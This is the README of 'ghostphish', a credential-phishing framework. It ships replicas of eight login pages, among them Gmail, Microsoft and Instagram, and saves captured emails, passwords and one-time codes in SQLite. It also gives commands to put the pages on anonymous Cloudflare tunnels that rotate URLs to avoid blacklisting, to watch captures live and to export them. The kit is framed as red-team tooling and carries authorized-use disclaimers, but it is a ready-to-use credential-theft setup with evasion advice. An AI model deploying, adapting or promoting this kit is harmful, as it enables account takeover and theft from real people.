<p align="center">
  <img src="assets/banner.svg" alt="ghostphish — modern phishing framework for authorized red team engagements" width="100%">
</p>

<p align="center">
  <a href="#quick-start"><img src="https://img.shields.io/badge/status-active-brightgreen?style=flat-square" alt="Status"></a>
  <a href="LICENSE"><img src="https://img.shields.io/badge/license-MIT-blue?style=flat-square" alt="License: MIT"></a>
  <img src="https://img.shields.io/badge/python-3.11+-3776ab?style=flat-square&logo=python&logoColor=white" alt="Python 3.11+">
  <img src="https://img.shields.io/badge/FastAPI-0.104-009688?style=flat-square&logo=fastapi&logoColor=white" alt="FastAPI">
  <img src="https://img.shields.io/badge/docker-ready-2496ED?style=flat-square&logo=docker&logoColor=white" alt="Docker">
  <img src="https://img.shields.io/badge/templates-8-ff2a3d?style=flat-square" alt="8 templates">
  <img src="https://img.shields.io/badge/tunnel-cloudflared-f38020?style=flat-square&logo=cloudflare&logoColor=white" alt="Cloudflared">
</p>

# ghostphish

A modern, Docker-based phishing framework for **authorized red team engagements** and **security research**.
Ships with 8 pixel-perfect login page replicas, one-command cloudflared tunneling, and structured credential capture in SQLite.

> ⚠️ **AUTHORIZED USE ONLY** — Ghostphish is intended for penetration testers, red teamers, and security researchers operating under a signed rules-of-engagement or explicit written permission. Using this tool against systems or people you do not own or lack authorization to test is illegal in most jurisdictions.

---

## Why ghostphish?

Most public phishing kits (zphisher, blackeye, etc.) ship with **outdated templates** that no longer match the real login pages of their targets — a giveaway to any target who is even moderately observant. Ghostphish takes a different approach:

- **Modern replicas** — pixel-close copies of the *current* login pages (2025/2026 designs), including 2-step Google/Microsoft OAuth flows and dark themes where applicable.
- **Real data storage** — SQLite with a proper schema, not flat text files. Query, export, or feed into other tooling.
- **Production-ish backend** — FastAPI + Docker, rate limiting, honeypot detection, structured logging.
- **One-command tunnel** — `./tunnel.sh` spins up a Cloudflare quick-tunnel and prints every phishing URL, ready to send.

## Templates

| # | Service   | Route        | Style |
|---|-----------|--------------|-------|
| 1 | Instagram | `/instagram` | Dark theme, "close friends" hero, real embedded photos |
| 2 | Facebook  | `/facebook`  | White bg, photo collage, "Explore the things you love." |
| 3 | Netflix   | `/netflix`   | Dark hero, red wordmark, floating labels |
| 4 | Twitter/X | `/twitter`   | Black bg, huge X logo, Google/Apple SSO buttons |
| 5 | Snapchat  | `/snapchat`  | Yellow header, ghost logo, minimalist form |
| 6 | LinkedIn  | `/linkedin`  | Beige bg, real logo, Google/Apple SSO |
| 7 | Microsoft | `/microsoft` | Cosmic dark bg, 2-step email→password flow |
| 8 | Gmail     | `/gmail`     | Dark theme, colored G, 2-step flow, email chip |

All templates:
- Are **self-contained** (no external CDN calls — everything base64-embedded)
- Match the **real target's redirect** after submit (e.g. `/facebook` submit → `facebook.com`)
- Show a realistic error state on repeat submissions
- Include the correct favicon, page title, and footer

## Screenshots

<table>
  <tr>
    <td align="center" width="50%">
      <img src="assets/screenshots/instagram.png" alt="Instagram — dark theme"><br>
      <sub><b>Instagram</b> — dark theme with "close friends" hero and embedded photo collage</sub>
    </td>
    <td align="center" width="50%">
      <img src="assets/screenshots/facebook.png" alt="Facebook — Explore the things you love"><br>
      <sub><b>Facebook</b> — white bg, floating photo cards, real FB &amp; Meta logos</sub>
    </td>
  </tr>
  <tr>
    <td align="center">
      <img src="assets/screenshots/netflix.png" alt="Netflix — Sign In"><br>
      <sub><b>Netflix</b> — dark hero, red wordmark, floating labels, reCAPTCHA disclaimer</sub>
    </td>
    <td align="center">
      <img src="assets/screenshots/twitter.png" alt="X (Twitter) — Sign in"><br>
      <sub><b>Twitter / X</b> — pure black bg, huge X logo, Google &amp; Apple SSO</sub>
    </td>
  </tr>
  <tr>
    <td align="center">
      <img src="assets/screenshots/linkedin.png" alt="LinkedIn — Sign in"><br>
      <sub><b>LinkedIn</b> — beige bg, real logo, Google/Apple SSO, "show" password toggle</sub>
    </td>
    <td align="center">
      <img src="assets/screenshots/snapchat.png" alt="Snapchat — Log in"><br>
      <sub><b>Snapchat</b> — yellow header, ghost logo, minimalist form, pill button</sub>
    </td>
  </tr>
  <tr>
    <td align="center">
      <img src="assets/screenshots/microsoft.png" alt="Microsoft — Sign in"><br>
      <sub><b>Microsoft</b> — cosmic dark bg, 2-step email→password flow, 4-square logo</sub>
    </td>
    <td align="center">
      <img src="assets/screenshots/gmail.png" alt="Gmail — Sign in"><br>
      <sub><b>Gmail</b> — real dark theme, colored G logo, email chip on step 2</sub>
    </td>
  </tr>
</table>

> All screenshots taken with a 1280×800 headless Chromium against localhost. Fonts and layout match the current (2025/2026) design of each target.

## Architecture

```
┌──────────────┐     ┌───────────────┐     ┌──────────────┐
│  Target      │────▶│  Cloudflare   │────▶│  Docker      │
│  (browser)   │     │  quick-tunnel │     │  FastAPI     │
└──────────────┘     └───────────────┘     └──────┬───────┘
                                                  │
                                                  ▼
                                          ┌──────────────┐
                                          │  SQLite      │
                                          │  captures.db │
                                          └──────────────┘
```

- **`app.py`** — FastAPI app, one route per template + `/submit` + `/admin/captures`
- **`data/captures.db`** — SQLite, table `captures(id, timestamp, service, email, password, otp, honeypot, ip_address, user_agent, referer, attempt_number)`
- **Rate limiting** — 5 attempts / IP / 5 min (in-memory, resets on restart)
- **Honeypot field** — hidden form input; non-empty submissions get logged and flagged

## Quick start

### 1. Requirements

- Docker + docker-compose
- (Optional) `cloudflared` binary for public tunneling — [install](https://developers.cloudflare.com/cloudflare-one/connections/connect-networks/downloads/)

### 2. Clone and start

```bash
git clone https://github.com/Yaman-RedTeam/ghostphish.git
cd ghostphish
docker-compose up -d --build
```

Server is now live at `http://localhost:8000`.

Visit any template:
- `http://localhost:8000/instagram`
- `http://localhost:8000/facebook`
- … etc.

### 3. Expose publicly with cloudflared

```bash
./tunnel.sh
```

Output:

```
════════════════════════════════════════════════════════
   ✓ TUNNEL ACTIVE
════════════════════════════════════════════════════════
   Public URL: https://xxx-yyy-zzz.trycloudflare.com

   ── Phishing pages ──────────────────────────────
   Instagram     https://xxx-yyy-zzz.trycloudflare.com/instagram
   Facebook      https://xxx-yyy-zzz.trycloudflare.com/facebook
   ...
```

**Why cloudflared over ngrok:**
- No account or auth token needed (quick-tunnel is anonymous)
- No warning interstitial page (ngrok's free tier shows one)
- HTTPS by default with a valid Cloudflare cert
- URL rotates per launch — harder to blacklist

### 4. Watch captures live

```bash
watch -n 2 'curl -s http://localhost:8000/admin/captures | python3 -m json.tool | head -60'
```

Or view stats:

```bash
python3 stats.py
```

### 5. Export

```bash
python3 export_captures.py csv     # → captures_YYYYMMDD_HHMMSS.csv
python3 export_captures.py json    # → captures_YYYYMMDD_HHMMSS.json
python3 export_captures.py stats   # minimal stats
```

### 6. Clean up

```bash
python3 cleanup.py clear    # delete all rows, keep schema
python3 cleanup.py delete   # remove DB file entirely
```

## Endpoints

| Method | Path                | Purpose                                    |
|--------|---------------------|--------------------------------------------|
| GET    | `/`                 | Landing page (list of templates)           |
| GET    | `/{service}`        | Serve phishing template for `service`      |
| POST   | `/submit`           | Accept `{service, email, password, otp, honeypot}` JSON |
| GET    | `/admin/captures`   | Return all captures as JSON                |
| POST   | `/admin/clear`      | Wipe DB rows                               |
| GET    | `/health`           | Health probe                               |

See [`API.md`](API.md) for full request/response schemas.

## Configuration

Edit `config.example.py` and rename to `config.py` (gitignored) for overrides. Defaults are safe for local testing.

Key knobs:
- Rate limit window & count
- Post-submit redirect URLs per service
- DB path

## Legal & ethical use

Ghostphish is a **research and authorized-testing tool**. Before you run it:

1. **You must have written permission** from every person/org whose credentials you might touch.
2. **Rules of engagement** should define scope, allowed targets, timing, and disclosure.
3. **Local law** — some jurisdictions require explicit consent from every message recipient, even during authorized engagements.

Suggested reading before your first engagement: [`ENGAGEMENT_CHECKLIST.md`](ENGAGEMENT_CHECKLIST.md).

The maintainers do not accept liability for misuse. **If you use this against someone without permission, you are committing a crime.**

## Contributing

New template contributions welcome — open a PR with:
- The route added to `app.py` matching the existing pattern
- Self-contained HTML (no external requests)
- Screenshot of the reference page you're replicating
- Entry in the README template table

Please **do not** submit templates for services that have specific anti-phishing regulations (banking, government portals) — those go beyond authorized-testing tooling.

## License

MIT — see [`LICENSE`](LICENSE).

## Maintainers

- [@Yaman-RedTeam](https://github.com/Yaman-RedTeam)
- [@Sikander700](https://github.com/Sikander700)

## Credits

- FastAPI, uvicorn, cloudflared — the tools that make this small
- Original inspiration: htr-tech/zphisher (this project keeps the spirit but rewrites the stack)
